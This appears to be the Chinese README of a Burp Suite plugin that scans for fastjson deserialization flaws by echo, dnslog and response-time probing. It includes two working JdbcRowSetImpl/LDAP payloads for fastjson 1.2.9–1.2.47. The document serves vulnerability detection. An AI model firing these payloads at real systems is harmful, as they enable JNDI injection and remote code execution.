# FastjsonScan

## 前言

学习了pmiaowu的fastjson扫描插件，其主要是两种检测方式

一种是利用c3p0回显探测

一种是利用dnslog探测

想了想如果不存在回显且对方不出网的情况下，就扫描不到了

所以添加了一种延迟探测方式，当回显以及dnslog无法探测出时采用延迟探测方式

根据访问开放端口与关闭端口的响应时间不同来判断是否存在漏洞点

fastjson 1.2.9-1.2.47

```json
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://localhost:808/badNameClass",
        "autoCommit":true
    }
}
```

还有一种通用payload,可用于parseObject的场景，但是测试了一下发现上面这个也行

```json
{"@type":"com.alibaba.fastjson.JSONObject",{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://localhost:8088/badNameClass",
        "autoCommit":true
    }
}}""}
```

https://mp.weixin.qq.com/s/5mO1L5o8j_m6RYM6nO-pAA

## 安装

![image](https://user-images.githubusercontent.com/78201553/191967284-76af0c5a-c370-494f-8d05-d6c8070e90f0.png)

将target\BurpFastJsonScan下jar包导入

## 效果展示

![image](https://user-images.githubusercontent.com/78201553/191967198-c46d0ad9-12d0-4e32-becd-3ddc19328fee.png)

![image](https://user-images.githubusercontent.com/78201553/191967387-d8affb46-b02c-4b4b-b833-fab9d64c8b85.png)

![image](https://user-images.githubusercontent.com/78201553/191968084-4bbe1ab2-f340-4932-aa33-a79cd5f02068.png)

![image](https://user-images.githubusercontent.com/78201553/191967460-b3950d6d-1e9e-4a7f-852b-659e6db3c449.png)
